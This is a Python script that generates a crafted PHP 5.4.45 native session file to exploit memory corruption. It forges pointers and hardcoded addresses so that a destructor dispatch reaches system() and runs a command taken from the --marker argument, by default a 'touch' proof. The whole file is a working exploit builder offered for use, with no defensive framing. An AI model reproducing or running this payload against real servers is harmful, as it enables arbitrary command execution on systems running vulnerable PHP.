#!/usr/bin/env python3
"""Build a PHP 5.4.45 native session payload (two-record, dtor -> PS(serializer))."""
import argparse, struct

PS_SERIALIZER = 0x7B6038
U1 = 0x200
U2 = 0x280
U3 = 0x220
LSTR = 973
FILESIZE = 0x400


def build(marker, x1, x2, system_addr, encode_addr, poff=0x2B8):
    core = ("touch %s #" % marker).encode()
    if len(core) > 32:
        raise SystemExit("marker command too long")
    key = b" " * (32 - len(core)) + core
    rec1 = bytes([32]) + key + b"R:1057;"
    hdr = ("s:%d:\"" % LSTR).encode()
    off = len(rec1)
    payload_start = off + 2 + len(hdr)
    buf = bytearray(b"A" * FILESIZE)
    buf[0:len(rec1)] = rec1
    buf[off] = 1
    buf[off + 1] = ord("z")
    buf[off + 2:off + 2 + len(hdr)] = hdr
    buf[payload_start + LSTR:payload_start + LSTR + 2] = b"\";"

    first = x1 + U1 - 0x2000
    last = x1 + U3 - 0x2000
    last_dtor = x1 + U2 - 0x2000
    k0 = (PS_SERIALIZER - last_dtor) // 8 - 1
    k3 = (0x380 + 0x2000 - U3) // 8
    f1 = x2 + 0x300

    def putq(o, v):
        buf[o:o + 8] = struct.pack("<Q", v & ((1 << 64) - 1))

    putq(poff, first)
    putq(poff+8, last)
    putq(poff+0x10, 0)
    putq(poff+0x18, last_dtor)
    putq(0x200, 0x1000)
    putq(0x220, k3)
    putq(0x280, k0)
    putq(0x300, f1)
    putq(0x308, encode_addr)
    putq(0x310, system_addr)
    return bytes(buf), dict(x1=x1, x2=x2, p=x1 + poff, f1=f1, first=first,
                            last=last, last_dtor=last_dtor, k0=k0, k3=k3,
                            system=system_addr, encode=encode_addr, marker=marker)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--marker", default="/tmp/p54n")
    ap.add_argument("--out", required=True)
    ap.add_argument("--x1", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--x2", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--system", type=lambda s: int(s, 0), default=0x7FFFF7D1C090)
    ap.add_argument("--encode", type=lambda s: int(s, 0), default=0x4B16B1)
    ap.add_argument("--poff", type=lambda s: int(s, 0), default=0x2B8)
    a = ap.parse_args()
    payload, info = build(a.marker, a.x1, a.x2, a.system, a.encode, a.poff)
    open(a.out, "wb").write(payload)
    print("wrote %s (%d bytes)" % (a.out, len(payload)))
    for k in ("x1", "x2", "p", "f1", "first", "last", "last_dtor", "k0", "k3", "system", "encode"):
        print("  %-10s 0x%x" % (k, info[k] & ((1 << 64) - 1)))
